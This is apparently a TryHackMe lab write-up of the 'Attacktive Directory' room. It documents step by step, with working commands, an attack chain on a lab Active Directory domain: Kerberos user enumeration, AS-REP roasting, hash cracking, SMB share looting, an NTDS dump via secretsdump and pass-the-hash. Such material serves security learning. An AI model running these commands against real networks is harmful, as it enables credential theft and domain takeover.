# Active Directory Attack Lab (Kerberos Exploitation)

## Lab Information

Platform: TryHackMe
Room: Attacktive Directory
Focus: Active Directory Exploitation
Difficulty: Intermediate

---

## Lab Overview

This project demonstrates a complete **Active Directory attack chain** performed in a controlled lab environment.

The objective of this lab was to enumerate an Active Directory domain, identify valid user accounts, exploit Kerberos authentication weaknesses, retrieve credentials, escalate privileges, and gain administrator access to the domain controller.

---

## Tools Used

* Nmap
* Kerbrute
* Impacket
* smbclient
* hashcat
* Evil-WinRM

---

## Attack Flow

```text
Nmap Scan
   ↓
Kerberos User Enumeration (Kerbrute)
   ↓
AS-REP Roasting
   ↓
Password Cracking
   ↓
SMB Share Enumeration
   ↓
Credential Discovery
   ↓
NTDS Dump
   ↓
Pass-the-Hash
   ↓
Domain Administrator Access
```

---

## Attack Methodology

### 1. Network Enumeration

The first step involved identifying open ports and services running on the target machine.
This helps determine if the system is part of an Active Directory domain.

Nmap was used for service discovery.

```bash
nmap -A -T4 TARGET_IP
```

Important services discovered:

* Kerberos (88)
* SMB (445)
* LDAP (389)

These services strongly indicated the presence of an **Active Directory Domain Controller**.

---

### 2. Kerberos User Enumeration

Since Kerberos authentication was running on the server, usernames in the domain could be enumerated.

The tool **Kerbrute** was used to identify valid domain users.

```bash
./kerbrute userenum -d spookysec.local --dc TARGET_IP users.txt
```

This revealed several valid users in the domain including:

* svc-admin
* james
* administrator

---

### 3. AS-REP Roasting

Some Active Directory accounts may have **Kerberos pre-authentication disabled**.

Using Impacket's **GetNPUsers.py**, Kerberos authentication responses can be requested for those users.

```bash
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -usersfile users.txt -dc-ip TARGET_IP -format hashcat -outputfile hashes.txt
```

This retrieves **AS-REP hashes**, which can be cracked offline.

---

### 4. Password Cracking

The retrieved Kerberos hashes were cracked using **Hashcat** with the rockyou wordlist.

```bash
hashcat -m 18200 hashes.txt rockyou.txt
```

This revealed credentials for the domain user:

svc-admin

---

### 5. SMB Share Enumeration

With valid credentials obtained, SMB shares on the domain controller were enumerated.

```bash
smbclient -L //TARGET_IP -U svc-admin
```

The output revealed several shares including a share named:

backup

---

### 6. Accessing the Backup Share

The backup share was accessed using smbclient.

```bash
smbclient //TARGET_IP/backup -U svc-admin
```

Inside the share, a file named **backup_credentials.txt** was discovered.

---

### 7. Decoding the Credentials

The credentials inside the file were encoded using Base64.

```bash
cat backup_credentials.txt
echo "ENCODED_STRING" | base64 -d
```

After decoding, the credentials revealed access to the account:

[backup@spookysec.local](mailto:backup@spookysec.local)

---

### 8. Dumping Domain Password Hashes

The backup account had replication privileges within the domain.
This allowed extraction of password hashes from the domain controller.

Using Impacket's **secretsdump.py**, NTDS password hashes were dumped.

```bash
python3 /opt/impacket/examples/secretsdump.py spookysec.local/backup:PASSWORD@TARGET_IP
```

This command extracted NTLM hashes for all domain users including the **Administrator** account.

---

### 9. Pass-the-Hash Attack

Instead of cracking the Administrator password, authentication was performed directly using the NTLM hash.

This technique is known as **Pass-the-Hash**.

```bash
evil-winrm -i TARGET_IP -u Administrator -H NTLM_HASH
```

This successfully provided **Administrator access** to the domain controller.

---

### 10. Retrieving the Administrator Flag

Once administrator access was obtained, the root flag was located on the Administrator desktop.

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
```

The root flag was successfully retrieved.

---

## Skills Demonstrated

* Active Directory Enumeration
* Kerberos Exploitation
* AS-REP Roasting
* SMB Share Enumeration
* Credential Harvesting
* NTDS Hash Extraction
* Pass-the-Hash Authentication
* Domain Privilege Escalation

---

## What I Learned

* Active Directory enumeration techniques
* Kerberos authentication weaknesses
* AS-REP roasting attacks
* SMB share exploitation
* NTDS password hash extraction
* Pass-the-Hash authentication

---

## Key Takeaway

Misconfigured Kerberos authentication and excessive replication privileges can lead to complete **Active Directory domain compromise**.

Understanding these attack paths is critical for both **penetration testers and defensive security teams**.
